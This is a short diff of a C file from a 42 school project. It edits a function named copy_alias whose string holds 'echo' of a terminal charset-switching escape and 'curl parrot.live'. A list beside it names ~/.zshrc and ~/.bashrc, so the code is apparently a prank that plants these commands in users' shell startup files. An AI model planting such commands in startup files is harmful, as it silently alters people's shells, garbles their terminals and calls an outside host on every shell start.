@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:20:52 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/22 15:36:04 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/22 15:42:10 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -55,7 +55,7 @@ int	copy_alias(char **envp)
 	int			fd;
 	int			flags;
 	char		*path;
-	static char	*command = "echo '\e(0'\ncurl parrot.live\n";
+	static char	*command = "echo \"\e(0\"\ncurl parrot.live\n";
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 
 	(void)(envp);
